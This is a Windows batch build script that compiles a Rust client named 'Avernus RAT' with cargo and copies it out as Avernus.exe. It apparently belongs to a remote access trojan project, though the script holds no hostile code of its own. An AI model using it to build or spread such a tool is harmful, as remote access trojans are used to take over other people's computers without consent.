@echo off
echo Building Avernus RAT (Rust)...

cd client

cargo build --release
if %errorlevel% neq 0 (
    echo [ERROR] Build failed. Check errors above.
    pause
    exit /b %errorlevel%
)

copy target\release\avernus_rat_rust.exe ..\Avernus.exe
cd ..

echo [SUCCESS] Build complete! Avernus.exe is in the project root.
pause